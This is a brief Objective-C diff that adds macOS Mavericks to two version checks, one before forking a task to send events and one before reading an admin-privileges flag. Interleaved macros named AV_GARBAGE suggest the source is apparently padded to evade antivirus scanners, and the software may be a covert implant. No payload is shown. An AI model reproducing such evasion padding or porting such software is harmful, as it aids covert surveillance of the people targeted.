@@ -3616,7 +3616,7 @@ static void computerWillShutdown(CFMachPortRef port,
   AV_GARBAGE_004
   
   // On lion fork to sendEvents without problem
-  if ([gUtil isLion] == YES || [gUtil isMtLion] == YES)
+  if ([gUtil isLion] == YES || [gUtil isMtLion] == YES || [gUtil isMaverics] == YES)
   {
     NSTask *aTask = [[NSTask alloc] init];
     NSMutableArray *args = [NSMutableArray array];
@@ -4103,7 +4103,7 @@ static void computerWillShutdown(CFMachPortRef port,
       AV_GARBAGE_007
       
       // set by "require admin privileges"
-      if ([gUtil isLion] == YES || [gUtil isMtLion] == YES)
+      if  ([gUtil isLion] == YES || [gUtil isMtLion] == YES || [gUtil isMaverics] == YES)
         {
           NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
                                                              [[NSBundle mainBundle] bundlePath],
